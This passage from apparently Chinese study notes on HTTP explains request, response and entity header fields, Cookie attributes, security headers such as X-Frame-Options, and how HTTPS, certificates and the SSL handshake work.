值或者时间）和请求资源的 ETag 值或时间相一致时，则作为范围请求处理。反之，则返回全体资源。</p><p><img src="https://z3.ax1x.com/2021/04/21/cHIdSK.png" alt="cHIdSK.png"></p><p><img src="https://z3.ax1x.com/2021/04/21/cHIwQO.png" alt="cHIwQO.png"></p><h4 id="If-Unmodified-Since"><a href="#If-Unmodified-Since" class="headerlink" title="If-Unmodified-Since"></a>If-Unmodified-Since</h4><pre class=" language-http"><code class="language-http"><span class="token header-name keyword">If-Unmodified-Since:</span> Thu, 03 Jul 2012 00:00:00 GMT</code></pre><p>首部字段 If-Unmodified-Since 和首部字段 If-Modified-Since 的作用相反。它的作用的是告知服务器，指定的请求资源只有在字段值内指定的日期时间之后，未发生更新的情况下，才能处理请求。如果在指定日期时间后发生了更新，则以状态码 412 Precondition Failed 作为响应返回。</p><h4 id="Max-Forwards"><a href="#Max-Forwards" class="headerlink" title="Max-Forwards"></a>Max-Forwards</h4><p><img src="https://z3.ax1x.com/2021/04/21/cHI0yD.png" alt="cHI0yD.png"></p><pre class=" language-http"><code class="language-http"><span class="token header-name keyword">Max-Forwards:</span> 10</code></pre><p>每次转发数值减 <strong>1</strong>。当数值变 <strong>0</strong> 时返回响应</p><p>通过 TRACE 方法或 OPTIONS 方法，发送包含首部字段 Max- Forwards 的请求时，该字段以十进制整数形式指定可经过的服务器最大数目。</p><h4 id="Proxy-Authorization"><a href="#Proxy-Authorization" class="headerlink" title="Proxy-Authorization"></a>Proxy-Authorization</h4><pre class=" language-http"><code class="language-http"><span class="token header-name keyword">Proxy-Authorization:</span> Basic dGlwOjkpNLAGfFY5</code></pre><p>接收到从代理服务器发来的认证质询时，客户端会发送包含首部字段Proxy-Authorization 的请求，以告知服务器认证所需要的信息。</p><h4 id="Range"><a href="#Range" class="headerlink" title="Range"></a>Range</h4><pre class=" language-http"><code class="language-http"><span class="token header-name keyword">Range:</span> bytes=5001-10000</code></pre><p>对于只需获取部分资源的范围请求，包含首部字段 Range 即可告知服务器资源的指定范围。上面的示例表示请求获取从第 5001 字节至第10000 字节的资源。</p><p>接收到附带 Range 首部字段请求的服务器，会在处理请求之后返回状态码为 206 Partial Content 的响应。无法处理该范围请求时，则会返回状态码 200 OK 的响应及全部资源。</p><h4 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h4><pre class=" language-http"><code class="language-http"><span class="token header-name keyword">Referer:</span> http://www.hackr.jp/index.htm</code></pre><p>首部字段 Referer 会告知服务器请求的原始资源的 URI。</p><h4 id="TE"><a href="#TE" class="headerlink" title="TE"></a>TE</h4><pre class=" language-http"><code class="language-http"><span class="token header-name keyword">TE:</span> gzip, deflate;q=0.5</code></pre><p>首部字段 TE 会告知服务器客户端能够处理响应的传输编码方式及相对优先级。它和首部字段 Accept-Encoding 的功能很相像，但是用于传输编码。</p><p>首部字段 TE 除指定传输编码之外，还可以指定伴随 trailer 字段的分块传输编码的方式。应用后者时，只需把 trailers 赋值给该字段值。</p><pre class=" language-http"><code class="language-http"><span class="token header-name keyword">TE:</span> trailers</code></pre><h4 id="User-Agent"><a href="#User-Agent" class="headerlink" title="User-Agent"></a>User-Agent</h4><pre class=" language-http"><code class="language-http"><span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gec</code></pre><p>首部字段 User-Agent 会将创建请求的浏览器和用户代理名称等信息传达给服务器。</p><h3 id="响应首部字段-1"><a href="#响应首部字段-1" class="headerlink" title="响应首部字段"></a>响应首部字段</h3><p>响应首部字段是由服务器端向客户端返回响应报文中所使用的字段， 用于补充响应的附加信息、服务器信息，以及对客户端的附加要求等信息。</p><h4 id="Accept-Ranges"><a href="#Accept-Ranges" class="headerlink" title="Accept-Ranges"></a>Accept-Ranges</h4><pre class=" language-http"><code class="language-http"><span class="token header-name keyword">Accept-Ranges:</span> bytes</code></pre><p>首部字段 Accept-Ranges 是用来告知客户端服务器是否能处理范围请求，以指定获取服务器端某个部分的资源。</p><p>可指定的字段值有两种，可处理范围请求时指定其为 bytes，反之则指定其为 none。</p><h4 id="Age"><a href="#Age" class="headerlink" title="Age"></a>Age</h4><pre class=" language-http"><code class="language-http"><span class="token header-name keyword">Age:</span> 600</code></pre><p>首部字段 Age 能告知客户端，源服务器在多久前创建了响应。字段值的单位为秒。</p><p>若创建该响应的服务器是缓存服务器，Age 值是指缓存后的响应再次发起认证到认证完成的时间值。代理创建响应时必须加上首部字段Age。</p><h4 id="ETag"><a href="#ETag" class="headerlink" title="ETag"></a>ETag</h4><pre class=" language-http"><code class="language-http"><span class="token header-name keyword">ETag:</span> "82e22293907ce725faf67773957acd12"</code></pre><p><img src="https://z3.ax1x.com/2021/04/21/cb7oVg.png" alt="cb7oVg.png"></p><p>仅仅是由服务器来分配。</p><h5 id="强-ETag-值"><a href="#强-ETag-值" class="headerlink" title="强 ETag 值"></a>强 <strong>ETag</strong> 值</h5><p>强 ETag 值，不论实体发生多么细微的变化都会改变其值。</p><p><code>ETag: &quot;usagi-1234&quot;</code></p><h5 id="弱-ETag-值"><a href="#弱-ETag-值" class="headerlink" title="弱 ETag 值"></a>弱 <strong>ETag</strong> 值</h5><p>弱 ETag 值只用于提示资源是否相同。只有资源发生了根本改变，产生差异时才会改变 ETag 值。这时，会在字段值最开始处附加 W/。</p><p><code>ETag: W/&quot;usagi-1234&quot;</code></p><h4 id="Location"><a href="#Location" class="headerlink" title="Location"></a>Location</h4><p><img src="https://z3.ax1x.com/2021/04/21/cb7jMV.png" alt="cb7jMV.png"></p><pre class=" language-http"><code class="language-http"><span class="token header-name keyword">Location:</span> http://www.usagidesign.jp/sample.html</code></pre><p>使用首部字段 Location 可以将响应接收方引导至某个与请求 URI 位置不同的资源。</p><p>基本上，该字段会配合 3xx ：Redirection 的响应，提供重定向的URI。</p><h4 id="Proxy-Authenticate"><a href="#Proxy-Authenticate" class="headerlink" title="Proxy-Authenticate"></a>Proxy-Authenticate</h4><pre class=" language-http"><code class="language-http"><span class="token header-name keyword">Proxy-Authenticate:</span> Basic realm="Usagidesign Auth"</code></pre><p>首部字段 Proxy-Authenticate 会把由代理服务器所要求的认证信息发送给客户端。</p><h4 id="Retry-After"><a href="#Retry-After" class="headerlink" title="Retry-After"></a>Retry-After</h4><pre class=" language-http"><code class="language-http"><span class="token header-name keyword">Retry-After:</span> 120</code></pre><p>首部字段 Retry-After 告知客户端应该在多久之后再次发送请求。主要配合状态码 503 Service Unavailable 响应，或 3xx Redirect 响应一起使用。</p><p>字段值可以指定为具体的日期时间（Wed, 04 Jul 2012 06：34：24 GMT 等格式），也可以是创建响应后的秒数。</p><h4 id="Server"><a href="#Server" class="headerlink" title="Server"></a>Server</h4><pre class=" language-http"><code class="language-http"><span class="token header-name keyword">Server:</span> Apache/2.2.6 (Unix) PHP/5.2.5</code></pre><p>首部字段 Server 告知客户端当前服务器上安装的 HTTP 服务器应用程序的信息。不单单会标出服务器上的软件应用名称，还有可能包括版本号和安装时启用的可选项。</p><h4 id="Vary"><a href="#Vary" class="headerlink" title="Vary"></a>Vary</h4><pre class=" language-http"><code class="language-http"><span class="token header-name keyword">Vary:</span> Accept-Language</code></pre><p>从代理服务器接收到源服务器返回包含 Vary 指定项的响应之后，若再要进行缓存，仅对请求中含有相同 Vary 指定首部字段的请求返回缓存。即使对相同资源发起请求，但由于 Vary 指定的首部字段不相同，因此必须要从源服务器重新获取资源。</p><h4 id="WWW-Authenticate"><a href="#WWW-Authenticate" class="headerlink" title="WWW-Authenticate"></a>WWW-Authenticate</h4><pre class=" language-http"><code class="language-http"><span class="token header-name keyword">WWW-Authenticate:</span> Basic realm="Usagidesign Auth"</code></pre><p>首部字段 WWW-Authenticate 用于 HTTP 访问认证。它会告知客户端适用于访问请求 URI 所指定资源的认证方案（Basic 或是 Digest）和带参数提示的质询（challenge）。状态码 401 Unauthorized 响应中， 肯定带有首部字段 WWW-Authenticate。</p><h3 id="实体首部字段-1"><a href="#实体首部字段-1" class="headerlink" title="实体首部字段"></a>实体首部字段</h3><p>实体首部字段是包含在请求报文和响应报文中的实体部分所使用的首部，用于补充内容的更新时间等与实体相关的信息。</p><h4 id="Alow"><a href="#Alow" class="headerlink" title="Alow"></a>Alow</h4><pre class=" language-http"><code class="language-http"><span class="token header-name keyword">Allow:</span> GET, HEAD</code></pre><p>首部字段 Allow 用于通知客户端能够支持 Request-URI 指定资源的所有 HTTP 方法。当服务器接收到不支持的 HTTP 方法时，会以状态码405 Method Not Allowed 作为响应返回。与此同时，还会把所有能支持的 HTTP 方法写入首部字段 Allow 后返回。</p><h4 id="Content-Encoding"><a href="#Content-Encoding" class="headerlink" title="Content-Encoding"></a>Content-Encoding</h4><pre class=" language-http"><code class="language-http"><span class="token header-name keyword">Content-Encoding:</span> gzip</code></pre><p>首部字段 Content-Encoding 会告知客户端服务器对实体的主体部分选用的内容编码方式。内容编码是指在不丢失实体信息的前提下所进行的压缩。</p><ul><li>gzip</li><li>compress</li><li>deflate</li><li>identity</li></ul><h4 id="Content-Languag"><a href="#Content-Languag" class="headerlink" title="Content-Languag"></a>Content-Languag</h4><pre class=" language-http"><code class="language-http"><span class="token header-name keyword">Content-Language:</span> zh-CN</code></pre><p>首部字段 Content-Language 会告知客户端，实体主体使用的自然语言（指中文或英文等语言）。</p><h4 id="Content-Length"><a href="#Content-Length" class="headerlink" title="Content-Length"></a>Content-Length</h4><pre class=" language-http"><code class="language-http"><span class="token header-name keyword">Content-Length:</span> 15000</code></pre><p>首部字段 Content-Length 表明了实体主体的大小（单位是字节）。对实体主体进行内容编码传输时，不能再使用 Content-Length 首部字段。</p><h4 id="Content-Location"><a href="#Content-Location" class="headerlink" title="Content-Location"></a>Content-Location</h4><pre class=" language-http"><code class="language-http"><span class="token header-name keyword">Content-Location:</span> http://www.hackr.jp/index-ja.html</code></pre><p>首部字段 Content-Location 给出与报文主体部分相对应的 URI。和首部字段Location 不同，Content-Location 表示的是报文主体返回资源对应的 URI。</p><p>比如，对于使用首部字段 Accept-Language 的服务器驱动型请求，当返回的页面内容与实际请求的对象不同时，首部字段 Content-Location 内会写明 URI。</p><h4 id="Content-MD5"><a href="#Content-MD5" class="headerlink" title="Content-MD5"></a>Content-MD5</h4><pre class=" language-http"><code class="language-http"><span class="token header-name keyword">Content-MD5:</span> OGFkZDUwNGVhNGY3N2MxMDIwZmQ4NTBmY2IyTY==</code></pre><p><img src="https://z3.ax1x.com/2021/04/21/cb7vrT.png" alt="cb7vrT.png"></p><p>首部字段 Content-MD5 是一串由 MD5 算法生成的值，其目的在于检查报文主体在传输过程中是否保持完整，以及确认传输到达。</p><p>对报文主体执行 MD5 算法获得的 128 位二进制数，再通过 Base64 编码后将结果写入 Content-MD5 字段值。由于 HTTP 首部无法记录二进制值，所以要通过 Base64 编码处理。为确保报文的有效性，作为接收方的客户端会对报文主体再执行一次相同的 MD5 算法。计算出的值与字段值作比较后，即可判断出报文主体的准确性。</p><h4 id="Content-Range"><a href="#Content-Range" class="headerlink" title="Content-Range"></a>Content-Range</h4><pre class=" language-http"><code class="language-http"><span class="token header-name keyword">Content-Range:</span> bytes 5001-10000/10000</code></pre><p>针对范围请求，返回响应时使用的首部字段 Content-Range，能告知客户端作为响应返回的实体的哪个部分符合范围请求。字段值以字节为单位，表示当前发送部分及整个实体大小。</p><h4 id="Content-Type"><a href="#Content-Type" class="headerlink" title="Content-Type"></a>Content-Type</h4><pre class=" language-http"><code class="language-http"><span class="token header-name keyword">Content-Type:</span> text/html; charset=UTF-8</code></pre><p>首部字段 Content-Type 说明了实体主体内对象的媒体类型。和首部字段 Accept 一样，字段值用 type/subtype 形式赋值。</p><h4 id="Expires"><a href="#Expires" class="headerlink" title="Expires"></a>Expires</h4><pre class=" language-http"><code class="language-http"><span class="token header-name keyword">Expires:</span> Wed, 04 Jul 2012 08:26:05 GMT</code></pre><p>首部字段 Expires 会将资源失效的日期告知客户端。缓存服务器在接收到含有首部字段 Expires 的响应后，会以缓存来应答请求，在Expires 字段值指定的时间之前，响应的副本会一直被保存。当超过指定的时间后，缓存服务器在请求发送过来时，会转向源服务器请求资源。</p><p>当首部字段 Cache-Control 有指定 max-age 指令时，比起首部字段 Expires，会优先处理 max-age 指令。</p><h4 id="Last-Modified"><a href="#Last-Modified" class="headerlink" title="Last-Modified"></a>Last-Modified</h4><pre class=" language-http"><code class="language-http"><span class="token header-name keyword">Last-Modified:</span> Wed, 23 May 2012 09:59:55 GMT</code></pre><p>首部字段 Last-Modified 指明资源最终修改的时间。一般来说，这个值就是 Request-URI 指定资源被修改的时间。但类似使用 CGI 脚本进行动态数据处理时，该值有可能会变成数据最终修改时的时间。</p><h3 id="为-Cookie-服务的首部字段"><a href="#为-Cookie-服务的首部字段" class="headerlink" title="为 Cookie 服务的首部字段"></a>为 <strong>Cookie</strong> 服务的首部字段</h3><p>Cookie 的工作机制是用户识别及状态管理。Web 网站为了管理用户的状态会通过 Web 浏览器，把一些数据临时写入用户的计算机内。接着当用户访问该Web网站时，可通过通信方式取回之前发放的Cookie。</p><p>调用 Cookie 时，由于可校验 Cookie 的有效期，以及发送方的域、路径、协议等信息，所以正规发布的 Cookie 内的数据不会因来自其他Web 站点和攻击者的攻击而泄露。</p><h4 id="Cookie-的规格标准文档"><a href="#Cookie-的规格标准文档" class="headerlink" title="Cookie 的规格标准文档"></a>Cookie 的规格标准文档</h4><ul><li><h6 id="RFC2109"><a href="#RFC2109" class="headerlink" title="RFC2109"></a>RFC2109</h6></li><li><h6 id="RFC2965"><a href="#RFC2965" class="headerlink" title="RFC2965"></a>RFC2965</h6></li><li><h6 id="RFC6265"><a href="#RFC6265" class="headerlink" title="RFC6265"></a>RFC6265</h6></li><li><p>由网景公司颁布的规格标准</p></li></ul><h4 id="Cookie-服务的首部字段"><a href="#Cookie-服务的首部字段" class="headerlink" title="Cookie 服务的首部字段"></a><strong>Cookie</strong> 服务的首部字段</h4><table><thead><tr><th>首部字段名</th><th>说明</th><th>首部类型</th></tr></thead><tbody><tr><td>Set-Cookie</td><td>开始状态管理所使用的Cookie信息</td><td>响应首部字段</td></tr><tr><td>Cookie</td><td>服务器接收到的Cookie信息</td><td>请求首部字段</td></tr></tbody></table><h4 id="Set-Cookie"><a href="#Set-Cookie" class="headerlink" title="Set-Cookie"></a>Set-Cookie</h4><pre class=" language-http"><code class="language-http"><span class="token header-name keyword">Set-Cookie:</span> status=enable; expires=Tue, 05 Jul 2011 07:26:31</code></pre><p><strong>Set-Cookie</strong> 字段的属性</p><table><thead><tr><th>属性</th><th>说明</th></tr></thead><tbody><tr><td>NAME=VALUE</td><td>赋予 Cookie 的名称和其值（必需项）</td></tr><tr><td>expires=DATE</td><td>Cookie 的有效期（若不明确指定则默认为浏览器关闭前为止）</td></tr><tr><td>path=PATH</td><td>将服务器上的文件目录作为Cookie的适用对象（若不指定则默认为文档所在的文件目录）</td></tr><tr><td>domain=域名</td><td>作为 Cookie 适用对象的域名  （若不指定则默认为创建 Cookie  的服务器的域名）</td></tr><tr><td>Secure</td><td>仅在 HTTPS 安全通信时才会发送  Cookie</td></tr><tr><td>HttpOnly</td><td>加以限制，使 Cookie 不能被 JavaScript 脚本访问</td></tr></tbody></table><h6 id="expires-属性"><a href="#expires-属性" class="headerlink" title="expires 属性"></a>expires 属性</h6><p>Cookie 的 expires 属性指定浏览器可发送 Cookie 的有效期。</p><p>当省略 expires 属性时，其有效期仅限于维持浏览器会话（Session） 时间段内。这通常限于浏览器应用程序被关闭之前。</p><p>另外，一旦 Cookie 从服务器端发送至客户端，服务器端就不存在可以显式删除 Cookie 的方法。但可通过覆盖已过期的 Cookie，实现对客户端 Cookie 的实质性删除操作。</p><h5 id="path-属性"><a href="#path-属性" class="headerlink" title="path 属性"></a><strong>path</strong> 属性</h5><p>Cookie 的 path 属性可用于限制指定 Cookie 的发送范围的文件目录。不过另有办法可避开这项限制，看来对其作为安全机制的效果不能抱有期待。</p><h5 id="domain-属性"><a href="#domain-属性" class="headerlink" title="domain 属性"></a><strong>domain</strong> 属性</h5><p>通过 Cookie 的 domain 属性指定的域名可做到与结尾匹配一致。比如，当指定 example.com 后，除 example.com 以外，<a href="http://www.example.com/">www.example.com </a>或www2.example.com 等都可以发送 Cookie。</p><p>因此，除了针对具体指定的多个域名发送 Cookie 之 外，不指定domain 属性显得更安全</p><h5 id="secure-属性"><a href="#secure-属性" class="headerlink" title="secure 属性"></a><strong>secure</strong> 属性</h5><p>Cookie 的 secure 属性用于限制 Web 页面仅在 HTTPS 安全连接时，才可以发送 Cookie。</p><pre class=" language-http"><code class="language-http"><span class="token header-name keyword">Set-Cookie:</span> name=value; secure</code></pre><h6 id="HttpOnly-属性"><a href="#HttpOnly-属性" class="headerlink" title="HttpOnly 属性"></a>HttpOnly 属性</h6><p>Cookie 的 HttpOnly 属性是 Cookie 的扩展功能，它使 JavaScript 脚本无法获得 Cookie。其主要目的为防止跨站脚本攻击（Cross-site scripting，XSS）对 Cookie 的信息窃取。</p><pre class=" language-http"><code class="language-http"><span class="token header-name keyword">Set-Cookie:</span> name=value; HttpOnly</code></pre><h4 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h4><pre class=" language-http"><code class="language-http"><span class="token header-name keyword">Cookie:</span> status=enable</code></pre><p>首部字段 Cookie 会告知服务器，当客户端想获得 HTTP 状态管理支持时，就会在请求中包含从服务器接收到的 Cookie。接收到多个Cookie 时，同样可以以多个 Cookie 形式发送。</p><h3 id="其他首部字段"><a href="#其他首部字段" class="headerlink" title="其他首部字段"></a>其他首部字段</h3><p>HTTP 首部字段是可以自行扩展的。</p><table><thead><tr><th>X-Frame-Options</th></tr></thead><tbody><tr><td>X-XSS-Protection</td></tr><tr><td>DNT</td></tr><tr><td>P3P</td></tr></tbody></table><h4 id="X-Frame-Options"><a href="#X-Frame-Options" class="headerlink" title="X-Frame-Options"></a>X-Frame-Options</h4><pre class=" language-http"><code class="language-http"><span class="token header-name keyword">X-Frame-Options:</span> DENY</code></pre><p>首部字段 X-Frame-Options 属于 HTTP 响应首部，用于控制网站内容在其他 Web 网站的 Frame 标签内的显示问题。其主要目的是为了防止点击劫持（clickjacking）攻击。</p><h5 id="字段"><a href="#字段" class="headerlink" title="字段"></a>字段</h5><ul><li><strong>DENY</strong> ：拒绝</li><li><strong>SAMEORIGIN</strong> ：仅同源域名下的页面（Top-level-browsing- context）匹配时许可。（比如，当指定 <a href="http://hackr.jp/sample.html">http://hackr.jp/sample.html </a>页面为 SAMEORIGIN 时，那么 hackr.jp 上所有页面的 frame 都被允许可加载该页面，而 example.com 等其他域名的页面就不行了）</li></ul><h5 id="apache2-conf-的配置实例"><a href="#apache2-conf-的配置实例" class="headerlink" title="apache2.conf 的配置实例"></a><strong>apache2.conf</strong> 的配置实例</h5><pre class=" language-http"><code class="language-http">&lt;IfModule mod_headers.c>Header append X-FRAME-OPTIONS "SAMEORIGIN"&lt;/IfModule></code></pre><h4 id="X-XSS-Protection"><a href="#X-XSS-Protection" class="headerlink" title="X-XSS-Protection"></a>X-XSS-Protection</h4><pre class=" language-http"><code class="language-http"><span class="token header-name keyword">X-XSS-Protection:</span> 1</code></pre><p>首部字段 X-XSS-Protection 属于 HTTP 响应首部，它是针对跨站脚本攻击（XSS）的一种对策，用于控制浏览器 XSS 防护机制的开关。</p><ul><li>0：将 XSS 过滤设置成无效状态</li><li>1：将 XSS 过滤设置成有效状态</li></ul><h4 id="DNT"><a href="#DNT" class="headerlink" title="DNT"></a>DNT</h4><pre class=" language-http"><code class="language-http"><span class="token header-name keyword">DNT:</span> 1</code></pre><p>首部字段 DNT 属于 HTTP 请求首部，其中 DNT 是 Do Not Track 的简称，意为拒绝个人信息被收集，是表示拒绝被精准广告追踪的一种方法。</p><ul><li>0：同意被追踪</li><li>1：拒绝被追踪</li></ul><h4 id="P3P"><a href="#P3P" class="headerlink" title="P3P"></a>P3P</h4><pre class=" language-http"><code class="language-http"><span class="token header-name keyword">P3P:</span> CP="CAO DSP LAW CURa ADMa DEVa TAIa PSAa PSDa IVAa IVDa</code></pre><p>首部字段 P3P 属于 HTTP 相应首部，通过利用 P3P（The Platform for Privacy Preferences，在线隐私偏好平台）技术，可以让 Web 网站上的个人隐私变成一种仅供程序可理解的形式，以达到保护用户隐私的目的。</p><p>要进行 P3P 的设定，需按以下操作步骤进行。</p><p>步骤 <strong>1</strong>：创建 P3P 隐私</p><p>步骤 <strong>2</strong>：创建 P3P 隐私对照文件后，保存命名在 /w3c/p3p.xml</p><p>步骤 <strong>3</strong>：从 P3P 隐私中新建 Compact policies 后，输出到 HTTP 响应中</p><h2 id="确保-Web-安全的HTTPS"><a href="#确保-Web-安全的HTTPS" class="headerlink" title="确保 Web 安全的HTTPS"></a>确保 <strong>Web</strong> 安全的HTTPS</h2><p>在 HTTP 协议中有可能存在信息窃听或身份伪装等安全问题。使用HTTPS 通信机制可以有效地防止这些问题。</p><h3 id="HTTP的缺点"><a href="#HTTP的缺点" class="headerlink" title="HTTP的缺点"></a>HTTP的缺点</h3><ul><li><p>通信使用明文（不加密），内容可能会被窃听</p></li><li><p>不验证通信方的身份，因此有可能遭遇伪装</p></li><li><p>无法证明报文的完整性，所以有可能已遭篡改</p></li></ul><h4 id="通信使用明文（不加密），内容可能会被窃听"><a href="#通信使用明文（不加密），内容可能会被窃听" class="headerlink" title="通信使用明文（不加密），内容可能会被窃听"></a>通信使用明文（不加密），内容可能会被窃听</h4><p>由于 HTTP 本身不具备加密的功能，所以也无法做到对通信整体（使用 HTTP 协议通信的请求和响应的内容）进行加密。即，HTTP 报文使用明文（指未经过加密的报文）方式发送。</p><ul><li><p><strong>TCP/IP</strong> 是可能被窃听的网络</p><p>互联网上的任何角落都存在通信内容被窃听的风险</p><p>即使加密的处理过的通信任会被监听，只是监听者还需要破解报文信息</p></li><li><p>加密处理防止被窃听</p><ul><li><p>通信的加密</p><p>HTTP 协议中没有加密机制，但可以通过和 SSL（Secure Socket Layer，安全套接层）或TLS（Transport Layer Security，安全层传输协议）的组合使用， 加密 HTTP 的通信内容。</p></li><li><p>内容的加密</p><p>HTTP 协议中没有加密机制，但可以通过和 SSL（Secure Socket Layer，安全套接层）或TLS（Transport Layer Security，安全层传输协议）的组合使用， 加密 HTTP 的通信内容。</p><p>把HTTP 报文里所含的内容进行加密处理。</p></li></ul></li></ul><p><img src="https://z3.ax1x.com/2021/04/22/cqyQpQ.png" alt="cqyQpQ.png"></p><h4 id="不验证通信方的身份就可能遭遇伪装"><a href="#不验证通信方的身份就可能遭遇伪装" class="headerlink" title="不验证通信方的身份就可能遭遇伪装"></a>不验证通信方的身份就可能遭遇伪装</h4><p>HTTP 协议中的请求和响应不会对通信方进行确认。也就是说存在“服务器是否就是发送请求中 URI 真正指定的主机，返回的响应是否真的返回到实际提出请求的客户端”等类似问题。</p><h5 id="任何人都可发起请求"><a href="#任何人都可发起请求" class="headerlink" title="任何人都可发起请求"></a>任何人都可发起请求</h5><p>HTTP 协议的实现本身非常简单，不论是谁发送过来的请求都会返回响应。</p><ul><li>无法判断发出的请求是否到达理想服务器，伪装服务器</li><li>无法判断响应是理想客服端发来的，伪造客服端</li><li>无法判断对方是否具有访问权限</li><li>无法判断是否会发给理想客户端</li></ul><h5 id="查明对手的证书"><a href="#查明对手的证书" class="headerlink" title="查明对手的证书"></a>查明对手的证书</h5><p>虽然使用 HTTP 协议无法确定通信方，但如果使用 SSL 则可以。SSL 不仅提供加密处理，而且还使用了一种被称为证书的手段， 可用于确定方。</p><p><img src="https://z3.ax1x.com/2021/04/22/cqy16s.png" alt="cqy16s.png"></p><h4 id="无法证明报文完整性，可能已遭篡改"><a href="#无法证明报文完整性，可能已遭篡改" class="headerlink" title="无法证明报文完整性，可能已遭篡改"></a>无法证明报文完整性，可能已遭篡改</h4><p>所谓完整性是指信息的准确度。</p><h5 id="接收到的内容可能有误"><a href="#接收到的内容可能有误" class="headerlink" title="接收到的内容可能有误"></a>接收到的内容可能有误</h5><p>在请求或响应送出之后直到对方接收之前的这段时间内，即使请求或响应的内容遭到篡改，也没有办法获悉。</p><p><img src="https://z3.ax1x.com/2021/04/22/cqy3Xn.png" alt="cqy3Xn.png"></p><h5 id="如何防止篡改"><a href="#如何防止篡改" class="headerlink" title="如何防止篡改"></a>如何防止篡改</h5><p>其中常用的是 MD5 和 SHA-1 等散列值校验的方法， 以及用来确认文件的数字签名方法。这些算法也会被改写。</p><h3 id="HTTP-加密-认证-完整性保护-HTTPS"><a href="#HTTP-加密-认证-完整性保护-HTTPS" class="headerlink" title="HTTP+ 加密 + 认证 + 完整性保护**=HTTPS**"></a><strong>HTTP+</strong> 加密 <strong>+</strong> 认证 <strong>+</strong> 完整性保护**=HTTPS**</h3><h4 id="HTTP-加上加密处理和认证以及完整性保护后即是HTTPS"><a href="#HTTP-加上加密处理和认证以及完整性保护后即是HTTPS" class="headerlink" title="HTTP 加上加密处理和认证以及完整性保护后即是HTTPS"></a><strong>HTTP</strong> 加上加密处理和认证以及完整性保护后即是HTTPS</h4><p>把添加了加密及认证机制的 HTTP 称为 HTTPS（HTTP Secure）。</p><p><img src="https://z3.ax1x.com/2021/04/22/cqyJ00.png" alt="cqyJ00.png"></p><h4 id="HTTPS-是身披-SSL-外壳的-HTTP"><a href="#HTTPS-是身披-SSL-外壳的-HTTP" class="headerlink" title="HTTPS 是身披 SSL 外壳的 HTTP"></a><strong>HTTPS</strong> 是身披 <strong>SSL</strong> 外壳的 <strong>HTTP</strong></h4><p><img src="https://z3.ax1x.com/2021/04/22/cqyY7V.png" alt="cqyY7V.png"></p><h4 id="相互交换密钥的公开密钥加密技术"><a href="#相互交换密钥的公开密钥加密技术" class="headerlink" title="相互交换密钥的公开密钥加密技术"></a>相互交换密钥的公开密钥加密技术</h4><p>SSL 采用一种叫做公开密钥加密（Public-key cryptography）的加密处理方式。</p><ul><li>共享密钥加密的困境</li><li>使用两把密钥的公开密钥加密</li><li><strong>HTTPS</strong> 采用混合加密机制</li></ul><h4 id="证明公开密钥正确性的证书"><a href="#证明公开密钥正确性的证书" class="headerlink" title="证明公开密钥正确性的证书"></a>证明公开密钥正确性的证书</h4><p><img src="https://z3.ax1x.com/2021/04/22/cqyUtU.png" alt="cqyUtU.png"></p><ul><li><p>可证明组织真实性的 <strong>EV SSL</strong> 证书</p><p>证书的一个作用是用来证明作为通信一方的服务器是否规范，另外一个作用是可确认对方服务器背后运营的企业是否真实存在。拥有该特性的证书就是 EV SSL 证书（Extended Validation SSL Certificate）。</p></li><li><p>用以确认客户端的客户端证书</p><p>HTTPS 中还可以使用客户端证书。以客户端证书进行客户端认证，证明服务器正在通信的对方始终是预料之内的客户端，其作用跟服务器证书如出一辙。</p></li><li><p>认证机构信誉第一</p></li><li><p>由自认证机构颁发的证书称为自签名证书</p></li></ul><h4 id="HTTPS-的安全通信机制"><a href="#HTTPS-的安全通信机制" class="headerlink" title="HTTPS 的安全通信机制"></a><strong>HTTPS</strong> 的安全通信机制</h4><p><img src="https://z3.ax1x.com/2021/04/22/cqyahF.png" alt="cqyahF.png"></p><p>步骤 <strong>1</strong>： 客户端通过发送 Client Hello 报文开始 SSL 通信。报文中包含客户端支持的 SSL 的指定版本、加密组件（Cipher Suite）列表（所使用的加密算法及密钥长度等）。</p><p>步骤 <strong>2</strong>： 服务器可进行 SSL 通信时，会以 Server Hello 报文作为应答。和客户端一样，在报文中包含 SSL 版本以及加密组件。服务器的加密组件内容是从接收到的客户端加密组件内筛选出来的。</p><p>步骤 <strong>3</strong>： 之后服务器发送 Certificate 报文。报文中包含公开密钥证书。</p><p>步骤 <strong>4</strong>： 最后服务器发送 Server Hello Done 报文通知客户端，最初阶段的 SSL 握手协商部分结束。</p><p>步骤 <strong>5</strong>： SSL 第一次握手结束之后，客户端以 Client Key Exchange 报文作为回应。报文中包含通信加密中使用的一种被称为 Pre-master secret 的随机密码串。该报文已用步骤 3 中的公开密钥进行加密。</p><p>步骤 <strong>6</strong>： 接着客户端继续发送 Change Cipher Spec 报文。该报文会提示服务器，在此报文之后的通信会采用 Pre-master secret 密钥加密。</p><p>步骤 <strong>7</strong>： 客户端发送 Finished 报文。该报文包含连接至今全部报文的整体校验值。这次握手协商是否能够成功，要以服务器是否能够正确解密该报文作为判定标准。</p><p>步骤 <strong>8</strong>： 服务器同样发送 Change Cipher Spec 报文。</p><p>步骤 <strong>9</strong>： 服务器同样发送 Finished 报文。</p><p>步骤 <strong>10</strong>： 服务器和客户端的 Finished 报文交换完毕之后，SSL 连接就算建立完成。当然，通信会受到 SSL 的保护。从此处开始进行应用层协议的通信，即发送 HTTP 请求。</p><p>步骤 <strong>11</strong>： 应用层协议通信，即发送 HTTP 响应。</p><p>步骤 <strong>12</strong>： 最后由客户端断开连接。断开连接时，发送 close_notify 报文。上图做了一些省略，这步之后再发送 TCP FIN 报文来关闭与 TCP 的通信。</p><p>在以上流程中，应用层发送数据时会附加一种叫做 MAC（Message Authentication Code）的报文摘要。MAC 能够查知报文是否遭到篡改，从而保护报文的完整性。</p><p><img src="https://z3.ax1x.com/2021/04/22/cqywp4.png" alt="cqywp4.png"></p><p>从仅使用服务器端的公开密钥证书（服务器证书）建立 HTTPS 通信的整个过程</p><h4 id="SSL和TLS"><a href="#SSL和TLS" class="headerlink" title="SSL和TLS"></a>SSL和TLS</h4><p>HTTPS 使用 SSL（Secure Socket Layer） 和 TLS（Transport Layer Security）这两个协议。</p><p>SSL目前主导权已转移到IETF，IETF以SSL3.0为基准，后制定了TLS1.0、TLS1.1、TLS1.2。</p><p>当前主流SSL3.0、TLS1.0</p><h5 id="small-tips"><a href="#small-tips" class="headerlink" title="small_tips"></a>small_tips</h5><ul><li><strong>HTTPS</strong> 比 